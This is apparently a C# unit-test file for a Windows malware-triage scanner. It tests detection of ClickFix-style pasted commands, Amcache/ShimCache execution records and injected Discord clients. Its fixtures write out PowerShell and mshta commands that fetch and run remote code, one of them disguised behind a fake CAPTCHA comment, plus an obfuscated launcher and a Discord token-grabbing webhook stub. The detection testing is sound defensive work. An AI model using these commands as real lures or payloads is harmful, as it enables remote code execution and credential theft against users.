using System.Text;
using Demiurge.Core.Collectors;
using Demiurge.Core.Intel;
using Demiurge.Core.Knowledge;
using Demiurge.Core.Model;
using Demiurge.Core.Rules;
using Demiurge.Core.Scoring;
using Demiurge.Core.Text;
using Microsoft.Extensions.Logging.Abstractions;

namespace Demiurge.Tests;

/// <summary>Comandos pegados (ClickFix), Amcache/ShimCache y Discord modificado.</summary>
public class ClickFixAmcacheDiscordTests
{
    private static ScanSnapshot Analyze(ScanSnapshot s, Dictionary<string, UserAnswer>? answers = null)
    {
        var rules = RuleSet.Load();
        var kb = KnowledgeBase.Load();
        var ctx = new RuleContext { Snapshot = s, Rules = rules, Kb = kb, Feeds = new FeedStore(NullLogger.Instance), Answers = answers ?? new() };
        s.Findings = new RulesEngine(NullLogger.Instance).Evaluate(ctx);
        new ScoringEngine(new TextCatalog(), kb).Score(new ScoringEngine.Inputs { Snapshot = s, Rules = rules, Context = ctx });
        return s;
    }

    private static ScanSnapshot WithCommand(string source, string command)
    {
        var s = new ScanSnapshot();
        s.Commands.Add(new TypedCommand { Source = source, Command = command, User = "lucia" });
        return s;
    }

    // ------------------------------------------------------------ ClickFix

    [Fact]
    public void RunMru_suffix_is_removed()
    {
        Assert.Equal("regedit", TypedCommandCollector.CleanRunMru(@"regedit\1"));
        Assert.Equal(@"\\nas\fotos", TypedCommandCollector.CleanRunMru(@"\\nas\fotos\1"));
    }

    [Fact]
    public void ClickFix_with_captcha_decoy_in_win_r_is_dangerous()
    {
        var s = Analyze(WithCommand("run", """powershell -w h -c "iwr https://cdn-verify.top/c.ps1 | iex"   # ✅ I am not a robot - reCAPTCHA Verification ID: 7721"""));
        var f = Assert.Single(s.Findings, x => x.HeuristicId == "H-38");
        Assert.Equal(80, f.Weight);
        Assert.Contains("Ejecutar (Win+R)", f.Explanation);
        Assert.Equal(GlobalVerdict.ProbableInfeccion, s.Verdict);
    }

    [Fact]
    public void Download_and_run_in_win_r_asks_and_the_answer_decides()
    {
        const string cmd = "powershell -nop -c \"irm http://185.10.1.2/a | iex\"";
        var pending = Analyze(WithCommand("run", cmd));
        var card = pending.Scores.Single();
        Assert.Equal(45, card.Score);
        Assert.NotNull(card.PendingQuestion);

        var key = pending.Commands[0].Key;
        UserAnswer Answer(string v) => new() { EntityKey = key, QuestionId = "pasted_command", Answer = v };
        Assert.Equal(90, Analyze(WithCommand("run", cmd), new() { [$"{key}|pasted_command"] = Answer("page") }).Scores.Single().Score);
        Assert.Empty(Analyze(WithCommand("run", cmd), new() { [$"{key}|pasted_command"] = Answer("no") }).Scores.Where(x => x.Score > 0));
    }

    [Fact]
    public void Writing_it_yourself_does_not_erase_a_decoy()
    {
        const string cmd = "mshta https://check-human.live/v.hta # Verificación humana";
        var key = WithCommand("run", cmd).Commands[0].Key;
        var s = Analyze(WithCommand("run", cmd), new() { [$"{key}|pasted_command"] = new UserAnswer { EntityKey = key, QuestionId = "pasted_command", Answer = "no" } });
        Assert.Equal(40, s.Scores.Single().Score);
    }

    [Theory]
    [InlineData("powershell", "irm get.scoop.sh | iex")]
    [InlineData("powershell", "powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"")]
    [InlineData("run", "cmd")]
    [InlineData("run", "regedit")]
    [InlineData("run", "%appdata%")]
    [InlineData("run", @"\\nas\fotos")]
    [InlineData("powershell", "Invoke-WebRequest https://example.com/file.zip -OutFile file.zip")]
    public void Normal_commands_are_not_flagged(string source, string command)
    {
        var s = Analyze(WithCommand(source, command));
        Assert.DoesNotContain(s.Findings, f => f.HeuristicId == "H-38");
    }

    [Fact]
    public void Same_command_in_powershell_history_weighs_less_than_in_win_r()
    {
        var s = Analyze(WithCommand("powershell", "iex (New-Object Net.WebClient).DownloadString('http://45.1.2.3/p')"));
        Assert.Equal(25, Assert.Single(s.Findings, x => x.HeuristicId == "H-38").Weight);
    }

    [Fact]
    public void Long_obfuscated_launcher_in_win_r_is_flagged()
    {
        var s = Analyze(WithCommand("run", "cmd /c start /min powershell -c \"$a='Ne'+'w-Obj'+'ect';$b=&$a Net.WebC`lient;$b.DownloadData\""));
        Assert.Contains(s.Findings, f => f.HeuristicId == "H-38");
    }

    [Fact]
    public void Explorer_address_bar_keeps_commands_not_folders()
    {
        Assert.True(TypedCommandCollector.IsCommandLike("Powershell.exe -c ping example.com     # C:\\empresa\\RRHH\\politica.docx"));
        Assert.True(TypedCommandCollector.IsCommandLike("mshta https://x.y/z"));
        Assert.False(TypedCommandCollector.IsCommandLike(@"C:\Users\lucia\Downloads"));
        Assert.False(TypedCommandCollector.IsCommandLike(@"\\nas\fotos"));
        Assert.False(TypedCommandCollector.IsCommandLike("Este equipo"));
    }

    [Fact]
    public void PowerShell_history_keeps_only_download_or_run_lines()
    {
        Assert.False(TypedCommandCollector.MatchesPrefilter("git status"));
        Assert.False(TypedCommandCollector.MatchesPrefilter("Get-ChildItem -Recurse"));
        Assert.True(TypedCommandCollector.MatchesPrefilter("irm get.scoop.sh | iex"));
        Assert.True(TypedCommandCollector.MatchesPrefilter("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"));
    }

    [Fact]
    public void Hosts_are_extracted_from_urls_and_bare_domains()
    {
        var hosts = Heuristics.ExtractHosts("irm get.scoop.sh | iex; curl https://evil.example.org/x.ps1 -o y").Select(h => h.Host).ToList();
        Assert.Contains("get.scoop.sh", hosts);
        Assert.Contains("evil.example.org", hosts);
    }

    // ------------------------------------------------------------ Amcache / ShimCache

    [Fact]
    public void Amcache_first_seen_date_counts_for_self_deleted_programs()
    {
        var s = new ScanSnapshot();
        s.Executions.Add(new ExecutionRecord { Path = @"c:\users\a\appdata\local\temp\build.exe", Name = "build.exe", Exists = false, FirstRun = DateTimeOffset.Now.AddDays(-2), Sources = ["Amcache"], Sha1 = "aa" });
        Analyze(s);
        Assert.Contains(s.Findings, f => f.HeuristicId == "H-34");
    }

    [Fact]
    public void Known_malware_hash_from_amcache_is_critical_even_if_deleted()
    {
        var s = new ScanSnapshot();
        s.Executions.Add(new ExecutionRecord
        {
            Path = @"c:\users\a\downloads\crack_setup.exe", Name = "crack_setup.exe", Exists = false, FirstRun = DateTimeOffset.Now.AddDays(-3),
            Sources = ["Amcache"], Sha1 = "bb", Malicious = new ReputationInfo { Source = "MalwareBazaar", Verdict = "malicious", Family = "LummaStealer" },
        });
        Analyze(s);
        var f = Assert.Single(s.Findings, x => x.HeuristicId == "H-40");
        Assert.Contains("LummaStealer", f.Explanation);
        Assert.Equal(GlobalVerdict.ProbableInfeccion, s.Verdict);
    }

    [Fact]
    public void ShimCache_win10_entries_are_parsed()
    {
        static byte[] Entry(string path, DateTime modified)
        {
            var p = Encoding.Unicode.GetBytes(path);
            var body = new List<byte>();
            body.AddRange(BitConverter.GetBytes((ushort)p.Length));
            body.AddRange(p);
            body.AddRange(BitConverter.GetBytes(modified.ToFileTime()));
            body.AddRange(BitConverter.GetBytes(0)); // data size
            var e = new List<byte>();
            e.AddRange("10ts"u8.ToArray());
            e.AddRange(BitConverter.GetBytes(0));
            e.AddRange(BitConverter.GetBytes(body.Count));
            e.AddRange(body);
            return e.ToArray();
        }
        var data = new List<byte>();
        data.AddRange(BitConverter.GetBytes(0x34));
        data.AddRange(new byte[0x30]);
        data.AddRange(Entry(@"\??\C:\Users\a\AppData\Local\Temp\x.exe", new DateTime(2026, 10, 1)));
        data.AddRange(Entry(@"C:\Windows\System32\notepad.exe", new DateTime(2024, 1, 1)));

        var entries = ExecutionHistoryCollector.ParseShimCache(data.ToArray()).ToList();
        Assert.Equal(2, entries.Count);
        Assert.Equal(@"C:\Users\a\AppData\Local\Temp\x.exe", entries[0].Path);
        Assert.Equal(new DateTime(2026, 10, 1), entries[0].Modified!.Value.LocalDateTime);
    }

    // ------------------------------------------------------------ Discord

    [Fact]
    public void Clean_discord_index_is_original()
    {
        Assert.Equal("original", AppIntegrityCollector.Evaluate("Discord", "module.exports = require('./core.asar');\n").Status);
        Assert.Equal("original", AppIntegrityCollector.Evaluate("Discord", "module.exports = require(\"./core.asar\")").Status);
    }

    [Fact]
    public void BetterDiscord_is_a_known_mod()
    {
        var r = AppIntegrityCollector.Evaluate("Discord", "require(\"C:\\\\Users\\\\a\\\\AppData\\\\Roaming\\\\BetterDiscord\\\\data\\\\betterdiscord.asar\");\nmodule.exports = require(\"./core.asar\");");
        Assert.Equal("mod", r.Status);
        Assert.Equal("BetterDiscord", r.ModName);
    }

    [Fact]
    public void Injected_discord_is_flagged_and_can_be_repaired()
    {
        var item = AppIntegrityCollector.Evaluate("Discord",
            "const https = require('https');\nconst w = 'https://discord.com/api/webhooks/123/abc';\nfunction grab(){ /* token */ }\nmodule.exports = require('./core.asar');");
        Assert.Equal("modified", item.Status);
        Assert.Contains("webhook de Discord", item.Indicators);
        item.Path = @"C:\Users\a\AppData\Local\Discord\app-1.0.9200\modules\discord_desktop_core-1\discord_desktop_core\index.js";
        item.User = "a";

        var s = new ScanSnapshot();
        s.AppIntegrity.Add(item);
        Analyze(s);
        var f = Assert.Single(s.Findings, x => x.HeuristicId == "H-39");
        Assert.Equal(90, f.Weight);
        Assert.Contains("repair_app", s.Scores.Single().AvailableActions);
        Assert.Equal(GlobalVerdict.ProbableInfeccion, s.Verdict);
    }

    [Fact]
    public void Clean_or_modded_discord_produces_no_findings()
    {
        var s = new ScanSnapshot();
        s.AppIntegrity.Add(new AppIntegrityInfo { App = "Discord", Path = @"C:\x\index.js", Status = "original" });
        s.AppIntegrity.Add(new AppIntegrityInfo { App = "Discord PTB", Path = @"C:\y\index.js", Status = "mod", ModName = "BetterDiscord" });
        Analyze(s);
        Assert.Equal(GlobalVerdict.Limpio, s.Verdict);
    }
}
